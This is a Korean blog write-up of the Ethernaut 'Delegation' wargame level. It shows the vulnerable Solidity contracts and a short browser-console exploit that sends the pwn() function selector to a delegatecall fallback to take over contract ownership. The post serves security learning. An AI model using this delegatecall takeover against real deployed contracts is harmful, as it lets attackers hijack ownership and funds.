---
emoji: 🧢
title: (Ethernaut 취약점 6) Delegation  
date: '2022-01-07 20:26:00'
author: 한성원
tags: ethernaut Token vulnerability
categories: 취약점분석
---


# 👋 1. Delegation
__Difficulty 4/10__

- 승리 조건
- 코드 분석
- 풀이
순서로 진행 될 것이다.

- - -

## 승리 조건
- instance의 ownership을 가져오면 승리한다.

- - -

## 코드 분석
분석은 주석에!

```solidity

contract Delegate {
    // owner의 contract
    address public owner;
    
    // constructor: set parameter _owner as owner of contract
    constructor(address _owner) public {
        owner = _owner;
    }
    
    //set msg.sender as owner
    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    // owner of contract
    address public owner;
    // Delegate contract
    Delegate delegate;
    
    //constructor with parameter delegate contract address
    constructor(address _delegateAddress) public {
        // set delegate as Delegate contract address
        delegate = Delegate(_delegateAddress);
        // set owner as deployer
        owner = msg.sender;
    }

    //fallback function
    fallback() external {
        //delegate에 delegatecall을 보낸다. 
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```
- - -

## 풀이
이 문제에서 우리의 목표는 ownership을 가져오는 것이다.

만약 우리가 가지고 있다면 우선 여기서 말해주는 힌트를 보자!
1. delegatecall
2. Fallback function
3. method id
를 알면 도움이 될 것이라고 말한다. 

### Delegate Call
delegate call은 일전에 내가 취약점 시리즈에서 다룬 적 있다! solidity official docs와 내 글을 보면 이해가 될 것이다.
[DelegateCall](https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/) <= Click
[Solidity Docs](https://docs.soliditylang.org/en/v0.8.10/introduction-to-smart-contracts.html) <= Click

### fallback 
Fallback 함수는 contract에서 함수를 실행시킬때 함수가 존재하지 않는다면 실행되는 function이다.

### method id
This is derived as the first 4 bytes of the Keccak hash of the ASCII form of the signature
즉 4 byte의 Keccak hash라고 생각하면 된다.

우리가 owner를 가져오기 위한 시나리오는 이렇다.
1. pwn()를 4 byte의 keccak hash로 하나의 변수에 저장한다.
2. Delegation contract에 1번에서 만든 변수를 data로 지정하고 transaction을 보낸다.
3. Delegation contract의 owner를 확인해본다.

모든 코드는 console창에서 이루어진다. 
ctrl + shift + i를 눌러 console창을 활성화 시키자
```javascript
// 기존의 owner를 확인한다.
await contract.owner()

// web3 library를 사용한다.
// encodePwn라는 변수에 pwn()을 4 byte keccak hash로 변형해 저장한다.
const encodePwn = web3.eth.abi.encodeFunctionSignature("pwn()")

// Delegation contract의  fallback function을 call한다. 
await contract.sendTransaction({data: encodePwn})

// owner가 자신인 것을 확인한다.
await contract.owner()
```

완료 후 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.
```
٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
```
- - -
## 마무리
delegatecall 은 low level function이라 아직 내가 완벽하게 이해했다고 말할 수는 없을 것 같다. ethernaut을 다 풀어본 후에 EVM에 대해 좀 더 깊히 배워야겠다는 생각이 든다. 왜냐면 나는 그냥 smart contract 개발자가 아닌 auditor가 되고싶기 때문이다!!!! 앞으로도 화이팅하자!


- - -
## 기타 정보
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org
- DelegateCall 취약점 :https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/
- Solidity Docs delegate call: https://docs.soliditylang.org/en/v0.8.10/introduction-to-smart-contracts.html

```toc

```